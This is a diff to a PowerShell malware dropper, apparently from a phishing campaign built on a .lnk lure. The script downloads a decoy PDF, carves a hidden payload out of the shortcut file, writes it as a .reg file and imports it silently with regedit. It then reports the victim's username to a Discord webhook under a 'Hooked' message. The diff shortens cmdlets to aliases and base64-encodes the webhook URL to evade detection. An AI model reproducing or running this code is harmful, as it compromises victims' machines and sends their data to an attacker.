@@ -2,14 +2,17 @@ iwr 'https://files.catbox.moe/qvj6fx.pdf' -OutFile ($d = Join-Path $env:TEMP 'me
 
 $1 = 2565719
 $2 = 5439
-$tempPath = Join-Path $env:TEMP 'path.txt'
-$currentPath = Get-Content -Path $tempPath
-Set-Location -Path $currentPath
-$lnkpaths = Get-ChildItem -Path $dirPath.Path -Recurse *.lnk | Where-Object { $_.length -eq $1 } | Select-Object -ExpandProperty FullName;
-$lnkpath = if ($lnkpaths -is [array]) {$lnkpaths[0]} else {$lnkpaths};
-$exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount $1 -ReadCount $1;
-$exePath = Join-Path $env:public '17399.reg';
-Set-Content $exePath ([byte[]]($exeFile | Select-Object -Skip $2)) -Encoding Byte;
-Start-Process -FilePath 'regedit' -ArgumentList '/s', $exePath;
+$t = Join-Path $env:TEMP 'path.txt'
+$currentPath = cat -Path $t
+cd -Path $currentPath
+$lps = dir -Path $dirPath.Path -Recurse *.lnk | ? { $_.length -eq $1 } | select -ExpandProperty FullName;
+$lp = if ($lps -is [array]) {$lps[0]} else {$lps};
+$ef = gc $lp -Encoding Byte -TotalCount $1 -ReadCount $1;
+$ep = Join-Path $env:public '17399.reg';
+sc $ep ([byte[]]($ef | select -Skip $2)) -Encoding Byte;
+saps -FilePath 'regedit' -ArgumentList '/s', $ep;
 
-irm 'https://discord.com/api/webhooks/1207030572061429810/YCbwSoX3RSmP2FCgLJTGGO7qihDEEDzw4fc3Ryt5nF5I1-EVWYIQE9ewNP489-08kUcw' -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** ``$env:USERNAME`` | ``$lnkpaths``"})
+$dB = [System.Convert]::FromBase64String(aAB0AHQAcABzADoALwAvAGQAaQBzAGMAbwByAGQALgBjAG8AbQAvAGEAcABpAC8AdwBlAGIAaABvAG8AawBzAC8AMQAyADAANwAwADMAMAA1ADcAMgAwADYAMQA0ADIAOQA4ADEAMAAvAFkAQwBiAHcAUwBvAFgAMwBSAFMAbQBQADIARgBDAGcATABKAFQARwBHAE8ANwBxAGkAaABEAEUARQBEAHoAdwA0AGYAYwAzAFIAeQB0ADUAbgBGADUASQAxAC0ARQBWAFcAWQBJAFEARQA5AGUAdwBOAFAANAA4ADkALQAwADgAawBVAGMAdwA=)
+$dS = [System.Text.Encoding]::UTF8.GetString($dB)
+
+irm $dS -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** ``$env:USERNAME`` | ``$lps``"})
